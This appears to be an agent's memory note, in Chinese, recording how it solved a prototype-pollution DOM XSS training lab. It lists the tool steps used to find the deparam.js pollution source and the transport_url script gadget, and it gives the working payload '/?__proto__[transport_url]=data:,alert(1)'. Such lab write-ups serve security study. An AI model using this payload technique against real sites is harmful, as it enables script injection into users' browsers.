---
metadata:
  node_type: memory
name: "arm-A lab-prototype-pollution-dom-xss-client-side"
description: "A 臂实录:客户端原型污染 DOM XSS 两片合成(query 源 + transport_url gadget)一次命中"
last_updated: 2026-10-09T19:19:31+08:00
created: 2026-10-09T19:19:31+08:00
---

### 2025 A 臂 lab-prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution

题面(page_read,开卷族):找 Object.prototype 污染源 + gadget,合成 alert()。

链条(三件 + 一读):
1. page_read 题页 → widget-lab-id(未盲猜路径,200)。
2. range_launch launch-url <canonical path> --jar /tmp/cj1.json → reused:false,实例 0ad6006e...。
3. bin_get /?search=test --out /tmp/pp_search.html → 原始字节保住 <script src>,读出
   /resources/js/deparam.js(污染源:deparam 解析 query,支持 __proto__[k]=v)
   /resources/js/searchLogger.js(gadget:`if(config.transport_url){ script.src = config.transport_url; document.body.appendChild(script) }`)。
4. page_alert `/?__proto__[transport_url]=data:,alert(1)` --settle-ms 3000 → fired=true,alerts:["alert:1"](真实浏览器断言,非纸面推断)。
5. banner_verdict → solved:true,congrats 行。

要点:
- http_session 会剥 script 块 → 取资产清单必须走 bin_get/raw 原始字节面。
- 客户端族判定面是浏览器 alert 事实 + 横幅首访,page_alert 一次到位;无需 exploit server。

